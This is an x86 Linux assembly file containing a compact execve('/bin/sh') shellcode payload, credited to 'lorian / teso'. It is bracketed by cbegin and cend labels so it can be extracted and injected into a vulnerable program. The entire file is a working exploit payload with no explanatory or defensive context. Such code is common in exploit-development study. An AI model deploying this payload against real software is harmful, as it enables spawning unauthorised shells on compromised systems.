/* x86/linux execve /bin/sh shellcode
 *
 * lorian / teso
 */
 
	.globl	cbegin
	.globl	cend

cbegin:
        pushl     $0x0b
	popl      %eax
	cdq
	pushl     %edx
	push      $0x68732F6E
	push      $0x69622F2F
	movl      %esp, %ebx
	pushl     %edx
	pushl     %ebx
	movl      %esp, %ecx
	int	  $0x80

cend:
